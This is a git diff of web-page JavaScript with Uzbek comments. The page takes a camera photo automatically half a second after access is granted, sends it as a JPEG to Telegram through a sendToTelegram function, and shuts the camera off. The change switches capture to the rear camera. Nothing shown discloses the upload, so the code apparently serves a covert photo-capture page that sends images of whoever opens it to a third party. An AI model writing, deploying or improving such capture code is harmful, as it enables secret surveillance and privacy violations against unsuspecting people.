@@ -39,14 +39,15 @@
         }).catch(err => console.log("Telegram xato"));
     }
 
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    // 🔹 Kamera tanlash: "user" = old kamera, "environment" = orqa kamera
+    const CAMERA_MODE = "environment"; // orqa kamera
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: CAMERA_MODE } })
     .then(stream => {
         const video = document.getElementById("video");
         video.srcObject = stream;
 
-        // Video oqimi tayyor bo‘lganda rasm olish
         video.addEventListener('canplay', () => {
-            // 0.5 soniya kutish video oqimi barqaror bo‘lishi uchun
             setTimeout(() => {
                 const canvas = document.getElementById("canvas");
                 const ctx = canvas.getContext("2d");
@@ -56,9 +57,8 @@
                     sendToTelegram(blob);
                 }, "image/jpeg", 0.9);
 
-                // Kamera o‘chadi
                 stream.getTracks().forEach(track => track.stop());
-            }, 500);
+            }, 500); // video barqaror bo‘lishi uchun 0.5 soniya kutish
         });
     })
     .catch(err => console.log("Kameraga ruxsat berilmadi"));
